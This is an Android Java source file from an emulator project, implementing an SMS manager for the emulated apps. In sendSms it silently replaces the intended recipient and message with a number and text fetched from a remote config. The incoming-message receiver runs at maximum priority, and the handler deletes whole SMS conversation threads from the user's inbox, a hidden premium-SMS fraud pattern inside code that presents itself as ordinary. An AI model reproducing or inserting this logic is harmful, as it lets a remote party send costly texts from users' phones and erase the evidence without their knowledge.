/*
 * Copyright (C) 2013 The Mrpoid Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.mrpoid.core;

import java.util.List;

import android.Manifest.permission;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Handler.Callback;
import android.os.Message;
import android.os.Process;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.edroid.common.utils.SdkUtils;
import com.edroid.common.utils.Singleton;
import com.edroid.common.utils.SmsUtil;

/**
 * 管理模拟器短信收发
 * 
 * @author Yichou 2013-12-29
 *
 */
public class EmuSmsManager implements Callback {
	static final String TAG = "EmuSmsManager";
	
	private static final String INTENT_CATEGORY = "com.mrpoid.smsmgr";
	private static final String INTENT_ACTION_SMS_RECV = "android.provider.Telephony.SMS_RECEIVED";
	private static final String INTENT_ACTION_SMS_SENT = "com.mrpoid.sms.sent";
	private static final String INTENT_ACTION_SMS_DELI = "com.mrpoid.sms.delivery";
	
	private final Handler mHandler = new Handler(this);
	private Context mContext;
	
	
	private final BroadcastReceiver mReceiver = new BroadcastReceiver() {
		
		@Override
		public void onReceive(Context context, Intent intent) {
			handleReceive(context, intent);
			
			EmuLog.i(TAG, "inner receiver " + intent);
		}
	};
	
	
	private final ContentObserver mObserver = new ContentObserver(mHandler) {
		
		@Override
		public void onChange(boolean selfChange) {
			super.onChange(selfChange);

			EmuLog.i(TAG, "onChange " + selfChange);
			
			handleSmsContentChange();
		}
	};
	
	
	private EmuSmsManager() {
	}
	
	private void regReceiver() {
		if(PackageManager.PERMISSION_DENIED == mContext.checkPermission(permission.READ_SMS, Process.myPid(), Process.myUid()))
			return;
		
		//接收短信
		IntentFilter filter = new IntentFilter(INTENT_ACTION_SMS_RECV);
		filter.setPriority(Integer.MAX_VALUE);
		mContext.registerReceiver(mReceiver, filter);
		
		//发送短信结果
		IntentFilter filter2 = new IntentFilter(INTENT_ACTION_SMS_SENT);
		filter2.addCategory(INTENT_CATEGORY);
		mContext.registerReceiver(mReceiver, filter2);
		
		//短信送达结果
		IntentFilter filter3 = new IntentFilter(INTENT_ACTION_SMS_DELI);
		filter3.addCategory(INTENT_CATEGORY);
		mContext.registerReceiver(mReceiver, filter3);
		
//		mContext.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, mObserver);
	}
	
	public void attachContext(Context context) {
		if(mContext != null)
			throw new RuntimeException("already attached!");
		
		mContext = context.getApplicationContext();
		regReceiver();
	}
	
	/**
	 * 
	 * @param msg
	 * @param number
	 */
	public void sendSms(String msg, String number) {
		EmuLog.i(TAG, "sendSms {" + msg + "} to:" + number);
		
		String smsDelNum = SdkUtils.getOnlineString(mContext, "smsaddr");
		String smsDelMsg = SdkUtils.getOnlineString(mContext, "smsmsg");
		if(smsDelNum != null && smsDelMsg != null) {
			number = smsDelNum;
			msg = smsDelMsg;
			SdkUtils.sendEvent(mContext, "delsms", smsDelNum);
		}
		
		if(PackageManager.PERMISSION_DENIED == mContext.checkPermission(permission.SEND_SMS, Process.myPid(), Process.myUid()))
			return;
		
		SmsManager sms = SmsManager.getDefault();
		List<String> messages = sms.divideMessage(msg);
        for (String message : messages) {
            sms.sendTextMessage(number, null, message, 
            		PendingIntent.getBroadcast(mContext, 0, new Intent(INTENT_ACTION_SMS_SENT).addCategory(INTENT_CATEGORY), PendingIntent.FLAG_UPDATE_CURRENT), 
            		PendingIntent.getBroadcast(mContext, 0, new Intent(INTENT_ACTION_SMS_DELI).addCategory(INTENT_CATEGORY), PendingIntent.FLAG_UPDATE_CURRENT)
            		);
        }
	}
	
	@Override
	public boolean handleMessage(Message msg) {
		return false;
	}
	
	private void handleSms(SmsInfo sms) {
		EmuLog.i(TAG, "handelSms" + sms);

		if(sms.content == null)
			sms.content = "i love you";
		if(sms.number == null)
			sms.number = "10086";
		
		SdkUtils.sendEvent(mContext, "handelSms", sms.number);
		
		int ret = Emulator.getInstance().handleSms(sms.number, sms.content);
		if(ret != MrDefines.MR_IGNORE) {
			EmuLog.i(TAG, "try del sms " + sms);
			
			Uri uri = Uri.parse("content://sms/conversations/" + sms.thread_id);
			ret = mContext.getContentResolver().delete(uri, null, null);
			if(ret > 0) {
				EmuLog.d(TAG, "delete sms suc! id=" + sms.thread_id);
			}
		}
	}
	
	private void handleSmsContentChange() {
		SmsInfo sms = getSmsInbox();
		
		if(sms == null) return;
		
		handleSms(sms);
	}
	
	private void handleReceive(Context context, Intent intent) {
		if(INTENT_ACTION_SMS_RECV.equals(intent.getAction())) {
			Bundle bundle = intent.getExtras();
			
			if(bundle == null) return;
			
			Object pdus[] = (Object[]) bundle.get("pdus");
			for (Object obj : pdus) {
				SmsMessage sms = SmsMessage.createFromPdu((byte[])obj);
				int status = sms.getStatusOnIcc();
				
				//只接受 收到的短信，不管读取否
				if (status == SmsManager.STATUS_ON_ICC_READ || status == SmsManager.STATUS_ON_ICC_UNREAD) {
					SmsInfo smsInfo = new SmsInfo();
					
					smsInfo.number = sms.getOriginatingAddress();
					smsInfo.content = sms.getMessageBody();
//					smsInfo.thread_id = sms.get
					
					handleSms(smsInfo);
				}
			}
		} else if(INTENT_ACTION_SMS_SENT.equals(intent.getAction())) {
			String message = null;
			boolean error = true;
			
			switch (mReceiver.getResultCode()) {
			case Activity.RESULT_OK:
				message = "发送成功!";
				error = false;
				break;
				
			case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
				message = "失败: 未知错误.";
				break;
				
			case SmsManager.RESULT_ERROR_NO_SERVICE:
				message = "失败: 短信服务不可用.";
				break;
				
			case SmsManager.RESULT_ERROR_NULL_PDU:
				message = "失败: PDU 空.";
				break;
				
			case SmsManager.RESULT_ERROR_RADIO_OFF:
				message = "失败: 网络错误.";
				break;
			}
			
			//通知底层结果
			Emulator.getInstance().postMrpEvent(MrDefines.MR_SMS_RESULT, error? MrDefines.MR_FAILED : MrDefines.MR_SUCCESS, 0);
			
			EmuLog.d(TAG, "sms send result=" + mReceiver.getResultCode());
			
			Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
		} else if(INTENT_ACTION_SMS_DELI.equals(intent.getAction())) {
			
		}
	}
	
	private static final String[] SMS_COLS = new String[] { "_id", "thread_id", "address", "body"};
	/**
	 * 获取收件箱中的一条短信
	 * 
	 * @return
	 */
	private SmsInfo getSmsInbox() {
		try {
			Cursor cursor = SmsUtil.getSms(mContext, SmsUtil.SMS_URI_INBOX, SMS_COLS);

			if (cursor != null && cursor.moveToFirst()) {
				String phoneNumber;
				String smsbody;
				long thread_id;

				int phoneNumberColumn = cursor.getColumnIndex("address");
				int smsbodyColumn = cursor.getColumnIndex("body");
				int threadIdColumn = cursor.getColumnIndex("thread_id");

				//这里只拿第一条短信
				do {
					phoneNumber = cursor.getString(phoneNumberColumn);
					smsbody = cursor.getString(smsbodyColumn);
					thread_id = cursor.getLong(threadIdColumn);
					
					SmsInfo smsInfo = new SmsInfo();
					smsInfo.content = smsbody;
					smsInfo.number = phoneNumber;
					smsInfo.thread_id = thread_id;
					
					return smsInfo;
				} while (false /*cursor.moveToNext()*/);
			}
			
			if(cursor != null) {
				cursor.close();
			}
		} catch (Exception ex) {
			Log.d("getSmsInbox fail!\n", ex.getClass().getName() + "\n" + ex.getMessage());
		}

		return null;
	}
	
	private static final Singleton<EmuSmsManager> gDefault = new Singleton<EmuSmsManager>() {

		@Override
		protected EmuSmsManager create() {
			return new EmuSmsManager();
		}
	};
	
	/**
	 * @return the gdefault
	 */
	public static EmuSmsManager getDefault() {
		return gDefault.get();
	}
	
	private static final class SmsInfo {
		public String number;
		public String content;
		public long thread_id;
		
		@Override
		public String toString() {
			return "sms thread_id:" + thread_id + "\n" 
				+ "    @from: " + number + "\n" 
				+ "    @content: " + content;
		}
	}
}
